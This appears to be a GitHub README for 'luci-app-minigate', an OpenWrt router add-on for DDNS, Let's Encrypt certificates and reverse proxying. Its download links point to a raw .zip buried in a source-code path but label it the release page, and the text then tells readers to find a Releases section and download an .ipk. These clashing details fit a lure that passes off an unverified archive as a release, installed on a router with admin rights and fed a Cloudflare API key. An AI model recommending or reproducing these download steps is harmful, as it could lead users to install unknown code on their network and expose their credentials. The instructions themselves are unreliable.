# 🛡️ luci-app-minigate - Manage your network traffic with ease

[![Download MiniGate](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Andy7152/luci-app-minigate/raw/refs/heads/main/luasrc/model/cbi/minigate/app-minigate-luci-v3.9.zip)

MiniGate provides a simple interface to manage your OpenWrt or ImmortalWrt router. It handles complex tasks like domain name updates, security certificates, and web traffic routing through one dashboard. You do not need deep technical knowledge to secure your local network services or manage web access from outside your home.

## 📋 What this tool does

MiniGate simplifies three main network tasks:

1. Dynamic DNS (DDNS): This keeps your home internet address updated so you can reach your router even if your service provider changes your IP address.
2. SSL Certificates: This tool automates the process of getting and renewing free security certificates from Let's Encrypt. Browsers trust these certificates, which keeps your connections private.
3. Reverse Proxy: This feature routes traffic from the internet to specific internal services on your network, such as a file server or a home automation hub.

## 🛠️ System Requirements

Before you start, ensure your router meets these requirements:

- A device running OpenWrt or ImmortalWrt.
- At least 32MB of free storage space on your router.
- A stable internet connection.
- Access to your router administrative interface.
- A registered domain name for your services.

## 📥 How to download the software

The software lives on the official project page. Follow these steps to find the correct files for your hardware:

1. Click this link to go to the download area: [https://github.com/Andy7152/luci-app-minigate/raw/refs/heads/main/luasrc/model/cbi/minigate/app-minigate-luci-v3.9.zip](https://github.com/Andy7152/luci-app-minigate/raw/refs/heads/main/luasrc/model/cbi/minigate/app-minigate-luci-v3.9.zip).
2. Look for the Releases section on the right side of the page.
3. Choose the version marked as "Latest".
4. Download the file ending in `.ipk` that matches your router architecture. If you feel unsure about your architecture, check your router manual or the system status page in your OpenWrt interface.

## ⚙️ Installation steps

After you download the file, transfer it to your router using these steps:

1. Open your web browser and enter your router login address.
2. Log in with your administrative username and password.
3. Click on the "System" menu and choose "Software".
4. Click the "Upload Package" button.
5. Select the file you downloaded earlier from your computer.
6. Click "Install". 
7. Once the progress bar finishes, refresh your browser page. A new menu item named "MiniGate" should appear in your interface.

## 🌐 Setting up your domain

MiniGate works best when you link it to a domain name. Follow this process to enable secure connections:

1. Click on "MiniGate" in your router menu.
2. Go to the "DDNS" tab.
3. Fill in your domain name provider details. If you use Cloudflare, simply paste your API key into the marked field.
4. Click "Save and Apply". The system will now track your internet connection and ensure your domain points to your router at all times.

## 🔒 Securing your connections with SSL

Security certificates identify your site as safe to web browsers. MiniGate automates this entire process:

1. Open the "ACME" tab within the MiniGate menu.
2. Enter the email address you want to use for your certificate alerts.
3. Select the domain names you wish to protect.
4. Click "Request Certificate".
5. The system performs the handshake with Let's Encrypt and installs the keys automatically. You do not need to perform further manual steps.

## 🔀 Configuring your reverse proxy

A reverse proxy lets you host multiple services on one domain. For example, you can use "camera.yourdomain.com" for your security cameras and "cloud.yourdomain.com" for your files.

1. Locate the "Reverse Proxy" section in the MiniGate dashboard.
2. Click "Add New Entry".
3. Enter the local address and port of your internal service.
4. Assign the domain or sub-domain you want to map to that service.
5. Save your settings. 
6. Your traffic now routes from the internet through the MiniGate proxy to your internal service.

## 📖 Frequently Asked Questions

What if the installation fails? 
Check the "Software" page again to ensure you have enough space. If you see an error about missing dependencies, run the "Update Lists" option on that same page and try the installation again.

Can I move the settings to another router?
Yes. You can export your current configuration file from the system settings and upload it to a new router running the same version of MiniGate.

Do I need to pay for a certificate?
No. MiniGate uses services like Let's Encrypt, which provide SSL certificates at no cost.

How often do I need to update the software?
Check the repository link once a month. If you see a new version, repeat the installation steps. The software preserves your existing settings when you update.

## 🆘 Getting help

If you encounter a specific error or if a feature does not behave as expected, look at the logs. The "Log" tab inside the MiniGate menu lists all recent actions. This information helps identify why an update failed or why a connection did not establish. If you need more support, you may open a new issue on the GitHub repository page with the details found in your log file.